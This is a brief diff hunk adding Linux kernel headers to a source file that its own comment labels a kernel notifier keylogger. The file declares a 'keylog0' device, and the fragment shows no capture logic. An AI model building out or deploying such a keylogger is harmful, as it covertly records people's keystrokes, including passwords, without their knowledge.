@@ -1,3 +1,9 @@
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/keyboard.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+#include <linux/notifier.h>
 //Kernel notifier keylogger Yonor & Elona
 #define DEVICE_NAME "keylog0"  // The Device name for our Device Driver
 static int major;  // The Major Number that will be assigned to our Device Driver
